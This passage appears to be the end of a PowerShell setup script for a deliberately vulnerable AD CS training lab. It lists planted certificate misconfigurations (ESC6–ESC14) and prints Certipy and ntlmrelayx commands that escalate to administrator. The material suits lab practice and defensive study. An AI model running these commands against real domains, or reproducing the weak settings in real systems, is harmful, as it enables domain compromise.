Write-Host "  ESC6  - EDITF_ATTRIBUTESUBJECTALTNAME2 enabled" -ForegroundColor White
Write-Host "  ESC7  - svc_backup has ManageCA permission" -ForegroundColor White
Write-Host "  ESC8  - Web Enrollment at http://$env:COMPUTERNAME/certsrv" -ForegroundColor White
Write-Host "  ESC11 - IF_ENFORCEENCRYPTICERTREQUEST disabled" -ForegroundColor White
Write-Host ""

Write-Host "DC Registry Settings (if configured):" -ForegroundColor Yellow
Write-Host "  ESC9  - StrongCertificateBindingEnforcement = 0" -ForegroundColor White
Write-Host "  ESC10 - CertificateMappingMethods = 0x1F (includes UPN)" -ForegroundColor White
Write-Host ""

Write-Host "User Configurations:" -ForegroundColor Yellow
Write-Host "  ESC14 - jsmith has weak altSecurityIdentities mapping" -ForegroundColor White
Write-Host ""

Write-Host "Attack Commands:" -ForegroundColor Yellow
Write-Host ""
Write-Host "  # Enumerate vulnerabilities" -ForegroundColor Cyan
Write-Host "  certipy find -u jsmith@$Domain -p 'Summer2026!' -dc-ip DC_IP -vulnerable" -ForegroundColor White
Write-Host ""
Write-Host "  # ESC1 - Request cert as Administrator" -ForegroundColor Cyan
Write-Host "  certipy req -u jsmith@$Domain -p 'Summer2026!' -ca ZSEC-CA -target $env:COMPUTERNAME.$Domain -template ESC1-VulnTemplate -upn administrator@$Domain" -ForegroundColor White
Write-Host ""
Write-Host "  # ESC8 - NTLM relay" -ForegroundColor Cyan
Write-Host "  ntlmrelayx.py -t http://$env:COMPUTERNAME.$Domain/certsrv/certfnsh.asp -smb2support --adcs --template ESC1-VulnTemplate" -ForegroundColor White
Write-Host ""

Write-Host "Documentation:" -ForegroundColor Yellow
Write-Host "  https://posts.specterops.io/certified-pre-owned-d95910965cd2" -ForegroundColor Gray
Write-Host "  https://github.com/ly4k/Certipy" -ForegroundColor Gray
Write-Host "  https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88f" -ForegroundColor Gray
Write-Host ""
